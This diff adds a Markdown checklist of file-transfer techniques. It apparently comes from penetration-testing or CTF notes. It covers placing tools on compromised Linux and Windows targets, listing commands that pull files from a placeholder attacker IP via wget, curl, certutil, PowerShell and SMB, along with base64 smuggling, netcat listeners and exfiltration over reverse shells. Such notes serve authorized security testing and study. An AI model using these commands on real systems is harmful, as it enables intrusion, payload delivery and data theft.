@@ -1,0 +1,45 @@
+🚀 Linux → Target (Linux)
+
+- [ ] `scp myfile user@target:/tmp/`
+- [ ] `wget http://<attacker-ip>/file -O /tmp/file`
+- [ ] `curl http://<attacker-ip>/file -o /tmp/file`
+- [ ] Python web server: `python3 -m http.server 80`
+- [ ] Transfer via base64:
+  - Encode: `base64 -w0 tool > tool.b64`
+  - On target: `base64 -d tool.b64 > tool && chmod +x tool`
+
+## 🚀 Linux → Target (Windows)
+
+- [ ] `python3 -m http.server ` (attacker)
+- [ ] On Windows target:
+  - `certutil -urlcache -split -f http://<attacker-ip>/tool.exe tool.exe`
+  - `powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker-ip>/tool.exe','tool.exe')"`
+  - `Invoke-WebRequest` if PowerShell is usable
+
+## 📡 Shared Folders / Mounts (Windows)
+
+- [ ] Upload via RDP: `\\TSCLIENT\C\share`
+- [ ] Copy via SMB share (if mounted): `copy \\<attacker-ip>\share\tool.exe .`
+- [ ] Use `net use Z: \\<ip>\share` to mount drive
+
+## 🧬 Through Reverse Shell
+
+- [ ] If `wget` or `certutil` isn’t present:
+  - `echo [base64 string] > file.b64` then decode with `certutil -decode`
+  - Use `nc.exe` to exfil and reinject files
+
+## 🐍 Python Socket Transfer (Manual)
+
+- [ ] Attacker:  
+  ```bash
+  nc -lvp 9001 < file
+  ```
+  
+## 📋 No Internet Access / Air-Gapped Transfers
+- [ ] Use `nc` (Netcat) to manually push files across the reverse shell
+- [ ] Use SMB shares (upload tool to share -> pull tool from share internally)
+- [ ] Use RDP shared folder (upload tool via clipboard or mapped drive)
+- [ ] Rebuild payloads locally inside the shell using echo/base64 if text transfer only possible
+- [ ] Use `scp` internally if SSH server is available internally
+- [ ] Use reverse shell to "echo" small scripts manually line-by-line if necessary
+- [ ] Consider compressing tool (zip, tar.gz) and encoding (base64) for easier transfer over unstable sessions
